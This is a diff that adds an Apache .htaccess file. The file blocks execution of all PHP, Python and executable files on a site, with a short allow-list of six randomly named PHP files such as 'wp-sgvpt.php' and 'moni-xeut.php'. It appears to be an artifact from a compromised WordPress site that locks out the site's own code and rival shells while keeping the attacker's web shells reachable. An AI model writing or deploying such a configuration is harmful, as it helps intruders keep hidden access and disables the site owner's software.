@@ -1,0 +1,8 @@
+<FilesMatch ".*\.(py|exe|phtml|php|PHP|Php|PHp|pHp|pHP|phP|PhP|php5|php6|php7|suspected)$">
+Order Allow,Deny
+Deny from all
+</FilesMatch>
+<FilesMatch "^(gcpznl.php|xazjdj.php|wp-sgvpt.php|wp-jzxlm.php|moni-xeut.php|moni-omhk.php)$">
+Order Allow,Deny
+Allow from all
+</FilesMatch>
